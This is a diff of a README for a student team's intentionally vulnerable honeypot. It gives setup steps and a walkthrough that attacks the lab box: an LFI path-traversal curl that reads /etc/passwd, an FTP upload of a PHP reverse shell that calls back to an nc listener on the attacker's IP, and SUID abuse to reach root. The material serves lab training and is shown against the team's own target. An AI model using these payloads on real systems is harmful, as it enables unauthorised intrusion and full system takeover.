@@ -2,25 +2,73 @@
 
 <hr>
 
-## **Introduction**
-A script to mount a Local File Inclusion (LFI) vulnerability for the Honeypot.
+## **Honeypot Overview**
+Honeypot is a small project from NRT Blue Team. 
+
+In the project, we are assigned to construct an intentional vulnerability to lure attackers for the goal of tracking them down during the hunt. 
+
+Within the scope of this document, we will set up the environment and pentest it.
+
++ Team members engage in the project:
+	+ Cuong Nguyen: build the vulnerability & the blueprint for the attack.
+	+ Jaskaran Mann: reproduce & report the attack results.
+	+ Tung Nguyen: reproduce & report the attack results.
 
 <br>
 
 ## **Installation**
-Please `clone` the git and run the `./setup.sh` script to set up the vulnerability ...
+1. Clone the repository.
+
+```bash
+git clone https://github.com/jayngng/NRTBlueTeam_VulnHP.git
+```
+
+2. Executing the following command with `sudo` privilege.
+
+```bash
+cd NRTBlueTeam_VulnHP
+chmod +x ./setup.sh
+sudo ./setup.sh
+``` 
+
+*Troubleshooting*: if there is any error in setting up the environment, please ensure that:
++ The Honeypot connects to the Internet.
++ Try executing:
+
+```bash
+sudo dpkg --configure -a
+sudo ./setup.sh
+```
+
+After the installation is finished, please navigate to the HTTP service of the Honeypot, we should see the following.
+
+![](image/installation.png)
+
+Please consider deleting the folder `NRTBlueTeam_VulnHP` after the Honeypot is fully installed. 
 
 <br>
 
 ## **Exploitation**
 
-Walkthrough of how to exploit the vulnerability.
+In this section, we will exploit the target.
+
+Overview of vulnerabilities on the box:
++ Initial Access: Local File Inclusion (LFI).
++ Privilege Escalation: Misconfigured SUID binary.
+
+| Attack IP | 192.168.12.1  |
+| Target IP | 192.168.12.10 |
+
+***Note***: Please notice that the IP address might be varied in different environment.
 
 #### **Enumeration**
-We'll begin with a `nmap` scan.
+We'll begin with a `nmap` scan with the tag `-sS` for half-way handshake scan (or SYN scan).
 
 ```bash
 $ sudo nmap -sS 192.168.12.10
+```
+
+```bash
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-14 13:36 AEST
 Nmap scan report for 192.168.12.10
 Host is up (0.00041s latency).
@@ -41,6 +89,9 @@ To access the `ftp` file share, we utilize the `ftp` command with the credential
 
 ```bash
 $ ftp 192.168.12.10
+```
+
+```bash
 Connected to 192.168.12.10.
 220 (vsFTPd 3.0.3)
 Name (192.168.12.10:jaenguyen): anonymous
@@ -70,11 +121,11 @@ drwxr-xr-x    3 ftp      ftp          4096 Sep 14 03:35 ..
 226 Directory send OK.
 ```
 
-Navigating to the directory, there is a `pubf.txt` file.
+Navigating to the directory, there is an accessible `pubf.txt` file.
 
 From the `ftp` interactive shell, we run `get <file>` to download a file and `put <file>` to upload a file.
 
-+ Download a file.
+[1]. Download the `pubf.txt`.
 
 ```bash
 ftp> get pubf.txt
@@ -85,7 +136,7 @@ local: pubf.txt remote: pubf.txt
 22 bytes received in 0.00 secs (190.1272 kB/s)
 ```
 
-Inspect the content of `pubf.txt`
++ Inspect the content of `pubf.txt` with `cat`.
 
 ```bash
 $ cat pubf.txt 
@@ -94,7 +145,7 @@ $ cat pubf.txt
 
 → The `/var/ftp/pub/` directory seems to be an absolute location to the file `pubf.txt` ...  
 
-+ Upload a random file.
+[2]. Upload a random file (any file of your choice).
 
 ```bash
 ftp> put test
@@ -115,8 +166,21 @@ The result indicates the `test` file has been successfully uploaded.
 #### **HTTP Service**
 Now, let's move on to enumerating the hidden directory with `gobuster`.
 
+To install the `gobuster`, we execute
+
+```bash
+$ sudo apt-get install -y gobuster
+```
+
+After `gobuster` is installed, we can then call it with tags:
++ `dir -u`: for target URL.
++ `-w <directory_list>`: for wordlists. 
+
 ```bash
 $ gobuster dir -u http://192.168.12.10 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+```
+
+```bash
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -136,16 +200,17 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /forms                (Status: 301) [Size: 314] [--> http://192.168.12.10/forms/]
 ```
 
-We drop our attention toward the `/development` directory.
+→ Looking at the outputs, we then drop our attention toward the `/development` directory.
 
-Navigate to the `/development/` →  Click on `ABOUT US`, we are redirected to a new `about-us` page.
+Navigate to the `/development/` directory →  Click on `ABOUT US`, we are redirected to a new `about-us` page.
 
-We notice that the entry URL of the page is: `...?view=about-us.html`, which might be vulnerable to LFI.
-
-To test our theory, we can use `curl`.
+We notice that the entry URL of the page is: `...?view=about-us.html`, which might be vulnerable to **Local File Inclusion (LFI)**. To test our theory, we utilize `curl`.
 
 ```bash
-$ curl -s http://192.168.12.10/development/index.php\\?view=../../../../../../../etc/passwd
+$ curl -s http://192.168.12.10/development/index.php\?view=../../../../../../../etc/passwd
+```
+
+```bash
 [...]
 <p>root:x:0:0:root:/root:/bin/bash
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
@@ -154,15 +219,14 @@ ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
 [...]
 ```
 
-The output successfully returns the contents of the `passwd` file in the target system.
-
+The result successfully returns the content of the `passwd` file in the target system. At this point, we comprehend that the target is vulnerable to LFI.
 
 #### LFI → Remote Code Execution (RCE)
 Recalling the `pubf.txt` file we discovered previously, let's us pull a reverse shell by following the below steps.
 
 [1]. Upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) onto the `ftp` file share.
 
-(Please change the `ip` and `port` to the ones of your local machine)
+***Note:*** please change the `$ip` and `$port` variables of the `php-reverse-shell.php` to your Attacker IP and a random port of your choice (I chose port 80 in this case).
 
 ```bash
 ftp> put php-reverse-shell.php
@@ -182,7 +246,7 @@ drwxr-xr-x    3 ftp      ftp          4096 Sep 14 03:50 ..
 226 Directory send OK.
 ```
 
-[2]. Trigger the shell.
+[2]. Set up a `nc` listener and trigger the shell.
 
 + On the first terminal, we set up `nc` listener.
 
@@ -214,7 +278,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 #### Privilege Escalation
 
 ##### SUID Abuse
-Local enumeration divulges a misconfigured `suid` binary that we can abuse to escalate your privilege.
+Local enumeration divulges a misconfigured `SUID` binary that we can abuse to escalate your privilege.
 
 ```bash
 $ find / -perm -u=s -ls 2>/dev/null
@@ -232,4 +296,4 @@ bash-4.3# whoami
 root
 ```
 
-and successfully obtained the root shell.
+and successfully obtain the `root` shell.
